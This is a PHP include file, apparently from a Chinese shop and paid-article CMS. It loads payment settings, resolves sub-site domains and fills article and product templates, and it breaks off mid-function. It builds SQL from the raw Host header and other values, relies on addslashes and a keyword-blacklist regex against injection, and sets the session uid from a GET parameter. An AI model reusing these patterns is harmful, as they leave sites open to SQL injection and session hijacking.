<?php
$dirx=dirname(dirname(__FILE__))."/";
$config=json_decode(file_get_contents($dirx."conn/config.json"));

$sql="select * from sl_config";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if(mysqli_num_rows($result) > 0) {
		
		$C_title=$row["C_title"];
		$C_keyword=$row["C_keyword"];
		$C_description=$row["C_description"];
		$C_copyright=$row["C_copyright"];
		$C_code=$row["C_code"];
		$C_logo=$row["C_logo"];
		$C_ico=$row["C_ico"];
		$C_kefu=$row["C_kefu"];
		$C_admin=$row["C_admin"];

		$C_m_logo=$row["C_m_logo"];
		$C_m_position=$row["C_m_position"];
		$C_m_width=$row["C_m_width"];
		$C_m_height=$row["C_m_height"];
		$C_m_transparent=$row["C_m_transparent"];

		$C_alipay_pid=$row["C_alipay_pid"];
		$C_alipay_pkey=$row["C_alipay_pkey"];
		$C_dmf_id=$row["C_dmf_id"];
		$C_dmf_key=$row["C_dmf_key"];
		$C_dmf_key2=$row["C_dmf_key2"];
		$C_qpay_appid=$row["C_qpay_appid"];
		$C_qpay_mchid=$row["C_qpay_mchid"];
		$C_qpay_key=$row["C_qpay_key"];

		$C_ttpay_mchid=$row["C_ttpay_mchid"];
		$C_ttpay_appid=$row["C_ttpay_appid"];
		$C_ttpay_secret=$row["C_ttpay_secret"];

		$C_7pay_pid=$row["C_7pay_pid"];
		$C_7pay_pkey=$row["C_7pay_pkey"];
		$C_codepay_id=$row["C_codepay_id"];
		$C_codepay_key=$row["C_codepay_key"];
		$C_codepay_type=$row["C_codepay_type"];
		$C_payjs_id=$row["C_payjs_id"];
		$C_payjs_key=$row["C_payjs_key"];
		$C_wx_appid=$row["C_wx_appid"];
		$C_wx_appsecret=$row["C_wx_appsecret"];
		$C_wx_mchid=$row["C_wx_mchid"];
		$C_wx_key=$row["C_wx_key"];
		$C_qqid=$row["C_qqid"];
		$C_qqkey=$row["C_qqkey"];

		$C_alicode=$row["C_alicode"];
		$C_wxcode=$row["C_wxcode"];

		$C_osson=$row["C_osson"];
		$C_oss_id=$row["C_oss_id"];
		$C_oss_key=$row["C_oss_key"];
		$C_oss_domain=$row["C_oss_domain"];
		$C_bucket=$row["C_bucket"];
		$C_region=$row["C_region"];

		$C_wxapp_id=$row["C_wxapp_id"];
		$C_wxapp_key=$row["C_wxapp_key"];
		$C_aliapp_id=$row["C_aliapp_id"];
		$C_aliapp_key=$row["C_aliapp_key"];
		$C_aliapp_key2=$row["C_aliapp_key2"];
		$C_bdapp_id=$row["C_bdapp_id"];
		$C_bdapp_key=$row["C_bdapp_key"];
		$C_bdapp_key2=$row["C_bdapp_key2"];
		$C_qqapp_id=$row["C_qqapp_id"];
		$C_qqapp_key=$row["C_qqapp_key"];
		$C_zjapp_id=$row["C_zjapp_id"];
		$C_zjapp_key=$row["C_zjapp_key"];

		$C_appt=$row["C_appt"];

		$C_alipayon=$row["C_alipayon"];
		$C_wxpayon=$row["C_wxpayon"];
		$C_7payon=$row["C_7payon"];
		$C_qpayon=$row["C_qpayon"];
		$C_dmfon=$row["C_dmfon"];
		$C_codepayon=$row["C_codepayon"];
		$C_payjson=$row["C_payjson"];
		$C_alicodeon=$row["C_alicodeon"];
		$C_wxcodeon=$row["C_wxcodeon"];

		$C_kefuon=$row["C_kefuon"];
		$C_regon=$row["C_regon"];
		$C_qqon=$row["C_qqon"];
		$C_wxon=$row["C_wxon"];
		$C_dxon=$row["C_dxon"];
		$C_rzon=$row["C_rzon"];
		$C_fee=$row["C_fee"];
		$C_rzfee=$row["C_rzfee"];
		$C_rzfeetype=$row["C_rzfeetype"];
		$C_zd=$row["C_zd"];

		$C_fzon=$row["C_fzon"];
		$C_fzk=$row["C_fzk"];
		$C_fzvip=$row["C_fzvip"];

		$C_punsh=$row["C_punsh"];
		$C_nunsh=$row["C_nunsh"];

		$C_vip1=$row["C_vip1"];
		$C_vip2=$row["C_vip2"];
		$C_vip3=$row["C_vip3"];
		$C_vip6=$row["C_vip6"];
		$C_vip12=$row["C_vip12"];
		$C_vip0=$row["C_vip0"];
		$C_p_discount=$row["C_p_discount"];
		$C_n_discount=$row["C_n_discount"];
		$C_p_discount2=$row["C_p_discount2"];
		$C_n_discount2=$row["C_n_discount2"];

		$C_template=$row["C_template"];
		$C_wap=$row["C_wap"];
		$C_beian=$row["C_beian"];
		$C_qrcode=$row["C_qrcode"];
		$C_email=$row["C_email"];
		$C_phone=$row["C_phone"];

		$C_authcode=$row["C_authcode"];
		$C_notice=$row["C_notice"];

		$C_mailtype=$row["C_mailtype"];
		$C_mailcode=$row["C_mailcode"];
		$C_smtp=$row["C_smtp"];
		$C_html=$row["C_html"];

		$C_fx1=$row["C_fx1"];
		$C_fx2=$row["C_fx2"];
		$C_fx3=$row["C_fx3"];

		$C_dx1=$row["C_dx1"];
		$C_dx2=$row["C_dx2"];
		$C_dx3=$row["C_dx3"];
		$C_dx4=$row["C_dx4"];
		$C_dx5=$row["C_dx5"];

		$C_memberon=$row["C_memberon"];
		$C_pwdcode=$row["C_pwdcode"];

		$C_mobile=$row["C_mobile"];
    	$C_smssign=$row["C_smssign"];
    	$C_userid=$row["C_userid"];
    	$C_codeid=$row["C_codeid"];
    	$C_codekey=$row["C_codekey"];

		$C_twice=$row["C_twice"];
		$C_uncopy=$row["C_uncopy"];
		$C_slide=$row["C_slide"];
		$C_backup=$row["C_backup"];
		$C_format=$row["C_format"];
		$C_bd_token=$row["C_bd_token"];

		$C_hotwords=$row["C_hotwords"];
		$C_fdomain=$row["C_fdomain"];
		$C_contact=getrs("select T_content from sl_text where T_del=0 and T_type=1","T_content");

		$C_domain=$_SERVER['HTTP_HOST'];
		$H_data=$row;
		$H_data["C_contact"]=$C_contact;
	}

	if(www($_SERVER['HTTP_HOST'])!=www($C_fdomain) && $C_fdomain!=""){//分站域名访问
		if(strpos($_SERVER['HTTP_HOST'],www($C_fdomain))!==false){//使用自带二级域名访问
			$fmid=intval(splitx($_SERVER['HTTP_HOST'],".",0));
		}else{//使用绑定域名访问
			$fmid=intval(getrs("select M_id from sl_member where M_domain='".$_SERVER['HTTP_HOST']."'","M_id"));
		}


		$sql="select * from sl_member where M_id=".$fmid;
		$result = mysqli_query($conn, $sql);
		if (mysqli_num_rows($result) > 0) {
			$row = mysqli_fetch_assoc($result);
			$M_sellertime=$row["M_sellertime"];
			$M_sellerlong=$row["M_sellerlong"];
			$M_show=$row["M_show"];

			if(time()-strtotime($M_sellertime)>$M_sellerlong*86400 && $C_fzk==1){//商家到期
				die("该用户未开通分站功能");
			}else{
				if($row["M_webtitle"]!=""){
					$C_title=$row["M_webtitle"];
					$H_data["C_title"]=$row["M_webtitle"];
				}
				if($row["M_keyword"]!=""){
					$C_keyword=$row["M_keyword"];
					$H_data["C_keyword"]=$row["M_keyword"];
				}
				if($row["M_description"]!=""){
					$C_description=$row["M_description"];
					$H_data["C_description"]=$row["M_description"];
				}
				if($row["M_logo"]!=""){
					$C_logo=$row["M_logo"];
					$H_data["C_logo"]=$row["M_logo"];
				}
				if($row["M_ico"]!=""){
					$C_ico=$row["M_ico"];
					$H_data["C_ico"]=$row["M_ico"];
				}
				if($row["M_qrcode"]!=""){
					$C_qrcode=$row["M_qrcode"];
					$H_data["C_qrcode"]=$row["M_qrcode"];
				}
				if($row["M_beian"]!=""){
					$C_beian=$row["M_beian"];
					$H_data["C_beian"]=$row["M_beian"];
				}
				if($row["M_copyright"]!=""){
					$C_copyright=$row["M_copyright"];
					$H_data["C_copyright"]=$row["M_copyright"];
				}
				if($row["M_mobile"]!=""){
					$C_phone=$row["M_mobile"];
					$H_data["C_phone"]=$row["M_mobile"];
				}
				if($row["M_notice"]!=""){
					$C_notice=$row["M_notice"];
					$H_data["C_notice"]=$row["M_notice"];
				}
				if($row["M_contact"]!=""){
					$C_contact=$row["M_contact"];
					$H_data["C_contact"]=$row["M_contact"];
				}
				if($row["M_code"]!=""){
					$C_code=$row["M_code"];
					$H_data["C_code"]=$row["M_code"];
				}
				if($row["M_kefu"]!=""){
					$C_kefu=$row["M_kefu"];
					$H_data["C_kefu"]=$row["M_kefu"];
				}
				
				if($row["M_template"]!=""){
					$C_template=$row["M_template"];
					$H_data["C_template"]=$row["M_template"];
				}
				if($row["M_wap"]!=""){
					$C_wap=$row["M_wap"];
					$H_data["C_wap"]=$row["M_wap"];
				}

				$priceup=1+$row["M_priceup"]/100;
				if($M_show==1){
					$M_ninfo=" and N_mid=$fmid ";
					$M_pinfo=" and P_mid=$fmid ";
				}else{
					$M_ninfo=" and N_mid=0 ";
					$M_pinfo=" and P_mid=0 ";
				}
			}
		}else{
			//die("该域名[".$_SERVER['HTTP_HOST']."]尚未绑定");
			$priceup=1;
			$fmid=0;
		}
	}else{
		$priceup=1;
		$fmid=0;
	}

if(strpos(strtolower($_SERVER['PHP_SELF']),"api/alipay/notify_url.php")===false && strpos(strtolower($_SERVER['PHP_SELF']),"pay/dmf/notify_url.php")===false){
	$_POST = array_map('check_input', $_POST);
}

if($_GET["uid"]!=""){
	$_SESSION["uid"]=$_GET["uid"];
}

function p($price){
	global $priceup,$M_show;
	if($M_show==1){
		return round($price,2);
	}else{
		return round($price*$priceup,2);
	}
	
}

function downpic($path,$url){
global $C_osson;
$name=date("YmdHis").gen_key(3).".jpg";
if(substr($url,0,2)=="//"){
    $url="http:".$url;
}
$url = getbody(str_replace("https://","http://",$url),"","GET");
file_put_contents($path.$name,$url);
if($C_osson==1){
	tooss("../media/".$name);
}
return $name;
}

function check_input($value){
	if (get_magic_quotes_gpc() || is_array($value)){
		return $value;
	}else{
		return addslashes($value);
	}
}

function check_input2($value){
	if (get_magic_quotes_gpc() || is_array($value)){
		return $value;
	}else{
		$value=str_replace(" ","_",$value);
		$value=str_replace("	","_",$value);
		return addslashes($value);
	}
}

function inject_check($sql_str) {
	if(is_array($sql_str)){
		return false;
	}else{
    	return preg_match('/select |xsspt.com|<script |<\/script>|insert |delete |and |or |update | select| insert| delete| and| or| update|join | join| union|union | declare|declare | master|master | exec|exec | truncate|truncate | where|where | begin|begin |char | char|chr | chr| mid|mid |-- | --|\'|\/\*|\*|\.\.\/|\.\//i', $sql_str);
    }
}

function text($t){
	global $conn,$id,$C_kefu,$C_keyword,$C_description,$fmid,$C_contact;
	$sql="select * from sl_text where T_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[T_title]",$row["T_title"],$t);
		$t = str_Replace("[T_pic]",pic($row["T_pic"]),$t);
		$t = str_Replace("[T_order]",$row["T_order"],$t);
		if($row["T_keywords"]==""){//如果单页关键词为空，则调用网站关键词
			$t = str_Replace("[T_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[T_keywords]",$row["T_keywords"],$t);
		}
		if($row["T_description"]==""){//如果单页描述为空，则调用网站描述
			$t = str_Replace("[T_description]",$C_description,$t);
		}else{
			$t = str_Replace("[T_description]",$row["T_description"],$t);
		}

		switch($row["T_type"]){
			case 0:
			$T_content=$row["T_content"];
			break;

			case 1:
			$kf=explode("|",$C_kefu);
			for($i=0;$i<count($kf);$i++){
				switch(splitx($kf[$i],"_",1)){
					case "qq":
					$type="QQ";
					$url="http://wpa.qq.com/msgrd?v=3&uin=".splitx($kf[$i],"_",0)."&site=qq&menu=yes";
					break;
					case "ww":
					$type="旺旺";
					$url="http://www.taobao.com/webww/ww.php?ver=3&touid=".splitx($kf[$i],"_",0)."&siteid=cntaobao&status=1&charset=utf-8";
					break;
					case "wx":
					$type="微信";
					$url="javascript:;";
					break;
					case "phone":
					$type="电话";
					$url="tel:".splitx($kf[$i],"_",0);
					break;
					case "email":
					$type="邮箱";
					$url="mailto:".splitx($kf[$i],"_",0);
					break;
				}
				$kefu=$kefu."<b>".splitx($kf[$i],"_",2)."</b> <a href=\"".$url."\">".$type."：".splitx($kf[$i],"_",0)."</a><br>";
			}
			if($fmid==0){
				$T_content="<iframe src=\"conn/mapload.php?C_address=".$row["T_address"]."&C_zb=".$row["T_zb"]."\" scrolling=\"no\" name=\"mapif\" type=\"1\" frameborder=\"0\" height=\"400\" width=\"100%\" style=\"margin: 20px 0\"></iframe><p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$row["T_content"]."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";
			}else{
				$T_content="<p style=\"font-size:20px;font-weight:bold;\">联系方式：</p><p>".$C_contact."</p><p style=\"font-size:20px;font-weight:bold;margin-top:10px;\">在线客服：</p><p>".$kefu."</p>";

			}

			
			break;

			case 2:
			$T_content=$row["T_content"].'<link href="css/form.css" rel="stylesheet">
<div class="form_container">
<form action="booksave.php?action=save" method="post">
<div class="right"><input type="text" name="G_title" placeholder="留言标题"></div>
<div class="right"><input type="text" name="G_name" placeholder="您的姓名"></div>
<div class="right"><input type="text" name="G_phone" placeholder="联系电话"></div>
<div class="right"><input type="text" name="G_mail" placeholder="电子邮箱"></div>
<div class="right"><textarea name="G_msg" placeholder="留言内容"></textarea></div>
<div class="right"><iframe src="conn/code_1.php?name=G_code" scrolling="no" frameborder="0" width="100%" height="40"></iframe></div>
<div class="right"><button type="submit">提交留言</button><button type="reset">重新填写</button></div>
</form>
</div>';
			break;
		}
		$t = str_Replace("[T_content]",editor_oss($T_content),$t);
	}
	return $t;
}

function news($t){
	global $conn,$id,$C_keyword,$C_description;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_nsort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",pic($row["S_pic"]),$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		if($row["S_content"]==""){
			$t = str_Replace("[S_content]",$C_description,$t);
		}else{
			$t = str_Replace("[S_content]",$row["S_content"],$t);
		}
		if($row["S_keywords"]==""){
			$t = str_Replace("[S_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[S_keywords]",$row["S_keywords"],$t);
		}
	}else{
		if(intval($M_id)>0){
			$M_shop=getrs("select * from sl_member where M_id=$M_id","M_shop");
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部文章",$t);
			$t = str_Replace("[S_content]","All Articles",$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}
		
	}
	return $t;
}

function newsinfo($t){
	global $conn,$id,$C_n_discount,$C_n_discount2,$C_keyword,$C_description;
	$genkey=t($_GET["genkey"]);
	$sql="select * from sl_news,sl_nsort where N_sort=S_id and N_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[N_id]",$row["N_id"],$t);
		$t = str_Replace("[N_title]",$row["N_title"],$t);
		$t = str_Replace("[N_pic]",pic($row["N_pic"]),$t);
		$t = str_Replace("[N_sort]",$row["N_sort"],$t);
		$t = str_Replace("[N_view]",$row["N_view"],$t);
		$t = str_Replace("[N_author]",$row["N_author"],$t);
		$t = str_Replace("[N_date]",$row["N_date"],$t);
		$t = str_Replace("[N_price]",p($row["N_price"]),$t);
		if($row["N_keywords"]==""){
			$t = str_Replace("[N_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[N_keywords]",$row["N_keywords"],$t);
		}
		if($row["N_description"]==""){
			$t = str_Replace("[N_description]",$C_description,$t);
		}else{
			$t = str_Replace("[N_description]",$row["N_description"],$t);
		}
		$N_vshow=$row["N_vshow"];
		$N_content=editor_oss($row["N_content"]);

		if($row["N_video"]!=""){
			if(strpos($row["N_video"],"<")!==false){
			    $N_video=$row["N_video"];
			}else{
			    if(substr($row["N_video"],0,7)=="http://" || substr($row["N_video"],0,8)=="https://"){
			        $N_video="<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"".pic($row["N_pic"])."\" controls><source src=\"".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $N_video="<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"".pic($row["N_pic"])."\" controls><source src=\"media/".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
			if($N_vshow==0){
				$N_content="<div style=\"margin-bottom:10px;\">".$N_video."</div>".$N_content;
			}else{
				$N_content=$N_content."<div style=\"margin-top:10px;\">".$N_video."</div>";
			}
		
		}

		$N_price=p($row["N_price"]);
		$N_date=$row["N_date"];
		$N_long=$row["N_long"];
		$N_tag=$row["N_tag"];
		$tag=explode(" ",$N_tag);
        for($i=0;$i<count($tag);$i++){
        	if($tag[$i]!=""){
        		$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=news&tag=".$tag[$i]."\">".$tag[$i]."</a>";
        	}
        	
    	}
    	if($N_tag!=""){
    		$t = str_Replace("[N_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[N_tag]","",$t);
    	}
		$length=mb_strlen(strip_tags($N_content),"utf-8");
		if(strpos($row["N_content"],"[fh_free]")!==false){
			$N_preview="<b>免费预览：</b>".splitx($row["N_content"],"[fh_free]",0)."<div style=\"border-bottom:1px solid #EEEEEE;padding-bottom:30px;margin-bottom:30px;\"></div>";
		}
	}

	$sql="select * from sl_news where N_del=0 and N_sh=1 order by N_order,N_id desc";
	$result = mysqli_query($conn,  $sql);
	if (mysqli_num_rows($result) > 0) {
	while($row = mysqli_fetch_assoc($result)) {
	    $Ne_list=$Ne_list.$row["N_id"].",";
	  }
	}
	$Ne_list=",0,".$Ne_list."0,";

	$N_Nid=splitx(splitx($Ne_list,",".$id.",",1),",",0);
	$N_Pid=splitx(splitx($Ne_list,",".$id.",",0),",",count(explode(",",splitx($Ne_list,",".$id.",",0)))-1);

	if($N_Nid=="0"){
	  $N_Ntitle="没有了";
	  $N_Nurl="javascript:;";
	}else{
	  $N_Ntitle=getrs("select * from sl_news where N_del=0 and N_id=".intval($N_Nid),"N_title");
	  $N_Nurl="?type=newsinfo&id=".$N_Nid;
	  
	}
	if($N_Pid=="0"){
	  $N_Ptitle="没有了";
	  $N_Purl="javascript:;";
	}else{
	  $N_Ptitle=getrs("select * from sl_news where N_del=0 and N_id=".intval($N_Pid),"N_title");
	  $N_Purl="?type=newsinfo&id=".$N_Pid;
	}
	$t = str_Replace("[N_Ntitle]",$N_Ntitle,$t);
	$t = str_Replace("[N_Nurl]",$N_Nurl,$t);
	$t = str_Replace("[N_Ptitle]",$N_Ptitle,$t);
	$t = str_Replace("[N_Purl]",$N_Purl,$t);

	if($N_price>0){//文章不免费
		if($N_long==0){//没开启了限时付费
			if(getrs("select * from sl_orders where O_content='".$genkey."' and O_state=1 and O_nid=".$id,"O_id")!="" && $genkey!=""){//已免登录购买
				$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
			}else{
				if($_SESSION["M_id"]!=""){//登录了会员
					$sql = "select * from sl_orders where O_del=0 and O_state=1 and O_type=1 and O_nid=".$id." and O_mid=".intval($_SESSION["M_id"]);
					$result = mysqli_query($conn, $sql);
					$row = mysqli_fetch_assoc($result);
					if (mysqli_num_rows($result) > 0) {//已购买
						$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
					} else {//没购买
						$sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
						$result = mysqli_query($conn, $sql);
						$row = mysqli_fetch_assoc($result);
						$M_viptime=$row["M_viptime"];
						$M_viplong=$row["M_viplong"];
						if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
							if($M_viplong>30000){
								$N_discount=$C_n_discount2/10;
							}else{
								$N_discount=$C_n_discount/10;
							}
						}else{
							$N_discount=1;
						}
						if($N_discount==0){//VIP会员0折
							$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
						}else{
							$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
						}
					}
				}else{//没登录会员
					$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
				}
			}
		}else{//开启了限时付费
			if(time()>strtotime("+$N_long hour",strtotime($N_date))){//已过收费期
				$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
			}else{//未过收费期
				$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
			}
		}
	}else{//免费
		$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
	}

	return $t;
}

function product($t){
	global $conn,$id,$C_keyword,$C_description;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_psort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",pic($row["S_pic"]),$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		if($row["S_content"]==""){
			$t = str_Replace("[S_content]",$C_description,$t);
		}else{
			$t = str_Replace("[S_content]",$row["S_content"],$t);
		}
		if($row["S_keywords"]==""){
			$t = str_Replace("[S_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[S_keywords]",$row["S_keywords"],$t);
		}
	}else{
		if(intval($M_id)>0){
			$M_shop=getrs("select * from sl_member where M_id=$M_id","M_shop");
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部商品",$t);
			$t = str_Replace("[S_content]","All Product",$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}
	}
	return $t;
}

function productinfo($t){
	global $conn,$id,$C_notice,$C_keyword,$C_description,$C_p_discount,$C_p_discount2,$C_fx1,$C_fx2,$C_fx3;
	$B_count=getrs("select count(*) as B_count from sl_orders where O_del=0 and O_state=1 and O_pid=".$id,"B_count");
	$E_count=getrs("select count(*) as E_count from sl_evaluate,sl_orders where O_del=0 and E_del=0 and O_state=1 and E_oid=O_id and O_pid=$id","E_count");

	$sql="select * from sl_product,sl_psort where P_sort=S_id and P_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$P_fx=$row["P_fx"];
		$P_price=$row["P_price"];
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[P_id]",$row["P_id"],$t);
		$t = str_Replace("[P_title]",$row["P_title"],$t);
		$t = str_Replace("[P_view]",$row["P_view"],$t);
		$t = str_Replace("[P_time]",$row["P_time"],$t);
		$t = str_Replace("[P_sold]",$row["P_sold"],$t);
		if($row["P_keywords"]==""){
			$t = str_Replace("[P_keywords]",$C_keyword,$t);
		}else{
			$t = str_Replace("[P_keywords]",$row["P_keywords"],$t);
		}
		if($row["P_description"]==""){
			$t = str_Replace("[P_description]",$C_description,$t);
		}else{
			$t = str_Replace("[P_description]",$row["P_description"],$t);
		}
		$t = str_Replace("[P_pic]",pic(splitx($row["P_pic"],"|",0)),$t);
		if($row["P_mid"]==0){
			$zy="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;margin-right:5px;display:inline;\">自营</span>";
			$shop="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">官方自营店</span>";
		}else{
			$zy="";
			$shop="<a href=\"./?type=product&M_id=".intval($row["P_mid"])."\" style=\"font-size:12px;background:#0099ff;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">".getrs("select * from sl_member where M_id=".intval($row["P_mid"]),"M_shop")."</a>";
		}
		$t = str_Replace("[P_zy]",$zy,$t);
		$t = str_Replace("[P_shop]",$shop,$t);

		$P_content=editor_oss($row["P_content"]);

		if($P_fx==1 && $P_price>0 && ($C_fx1>0 || $C_fx2>0 || $C_fx3>0)){
			$P_content="<div style=\"padding:20px;margin-bottom:20px;background:url('images/pricebg.png')\">本商品可参与分享赚佣金计划 【佣金".($C_fx1*$P_price/100)."元】 <a style=\"float:right;background:#f32196;color:#ffffff;border-radius:5px;padding:0 5px\" href=\"conn/poster.php?type=product&id=$id&from=".intval($_SESSION["M_id"])."\">点击参与</a></div>".$P_content;
		}

		$P_vshow=$row["P_vshow"];

		if($row["P_shuxing"]!=""){
			$s=explode("\r",$row["P_shuxing"]);
			for($i=0;$i<count($s);$i++){
				$shuxing=$shuxing."<div style=\"width:33%;display:inline-block\">".$s[$i]."</div>";
			}
			$shuxing="<div style=\"background:#f7f7f7;border:solid 1px #DDDDDD;padding:20px;margin-bottom:10px;\"><p><b>商品参数：</b></p>".$shuxing."</div>";
		}
		if($row["P_video"]!=""){
			if(strpos($row["P_video"],"<")!==false){
			    $P_video=$row["P_video"];
			}else{
			    if(substr($row["P_video"],0,7)=="http://" || substr($row["P_video"],0,8)=="https://"){
			        $P_video="<video width=\"100%\" style=\"max-height:500px;background:#000000;\"  poster=\"".pic(splitx($row["P_pic"],"|",0))."\" controls><source src=\"".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $P_video="<video width=\"100%\"  style=\"max-height:500px;background:#000000;\" poster=\"".pic(splitx($row["P_pic"],"|",0))."\" controls><source src=\"media/".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
			if($P_vshow==0){
				$P_content="<div style=\"margin-bottom:10px;\">".$P_video."</div>".$P_content;
			}else{
				$P_content=$P_content."<div style=\"margin-bottom:10px;\">".$P_video."</div>";
			}
		}
		$t = str_Replace("[P_shuxing]",$shuxing,$t);
		$t = str_Replace("[P_content]",$P_content,$t);
		$t = str_Replace("[P_sort]",$row["P_sort"],$t);
		
		if($row["P_vip"]==1){//如果商品开启了参与VIP活动
			if($C_p_discount<10){//普通VIP有折扣
				$s="<span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">VIP￥".p($row["P_price"]*$C_p_discount/10)."</span>";
			}
			if($C_p_discount2<$C_p_discount){
				$s=$s."<span style=\"background:#FFCC00;color:#000000;padding: 0 3px;border-radius: 5px;\">SVIP￥".p($row["P_price"]*$C_p_discount2/10)."</span>";
			}
			$t = str_Replace("[P_price]",p($row["P_price"])."<a target=\"_blank\" href=\"member/vip.php\" style=\"background:#FFCC00;font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\">$s</a>",$t);

		}else{
			$t = str_Replace("[P_price]",p($row["P_price"]),$t);
		}

		$t = str_Replace("[P_sell]",$row["P_sell"],$t);
		$t = str_Replace("[P_selltype]",$row["P_selltype"],$t);
		$t = str_Replace("[B_count]",$B_count,$t);
		$t = str_Replace("[E_count]",$E_count,$t);
		$P_selltype=$row["P_selltype"];
		$P_sell=$row["P_sell"];
		$P_restx=$row["P_rest"];
		$P_tag=$row["P_tag"];
		$tag=explode(" ",$P_tag);
        for($i=0;$i<count($tag);$i++){
        	$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=product&tag=".$tag[$i]."\">".$tag[$i]."</a>";
    	}
    	if($P_tag!=""){
    		$t = str_Replace("[P_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[P_tag]","",$t);
    	}
	}

	switch ($P_selltype) {
		case 0:
			$P_resttitle="充足";
			$P_rest=1;
			break;

			case 1:
			$P_resttitle=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count")."件";
			$P_rest=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count");
			break;

			case 2:
			$P_resttitle=$P_restx."件";
			$P_rest=$P_restx;
			break;
	}

	$sql="select * from sl_product where P_del=0 and P_sh=1 order by P_order,P_id desc";
	$result = mysqli_query($conn,  $sql);
	if (mysqli_num_rows($result) > 0) {
	while($row = mysqli_fetch_assoc($result)) {
	    $Pe_list=$Pe_list.$row["P_id"].",";
	  }
	}
	$Pe_list=",0,".$Pe_list."0,";

	$P_Nid=splitx(splitx($Pe_list,",".$id.",",1),",",0);
	$P_Pid=splitx(splitx($Pe_list,",".$id.",",0),",",count(explode(",",splitx($Pe_list,",".$id.",",0)))-1);

	if($P_Nid=="0"){
	  $P_Ntitle="没有了";
	  $P_Nurl="javascript:;";
	}else{
	  $P_Ntitle=getrs("select * from sl_product where P_del=0 and P_id=".intval($P_Nid),"P_title");
	  $P_Nurl="?type=productinfo&id=".$P_Nid;
	}
	if($P_Pid=="0"){
	  $P_Ptitle="没有了";
	  $P_Purl="javascript:;";
	}else{
	  $P_Ptitle=getrs("select * from sl_product where P_del=0 and P_id=".intval($P_Pid),"P_title");
	  $P_Purl="?type=productinfo&id=".$P_Pid;
	}

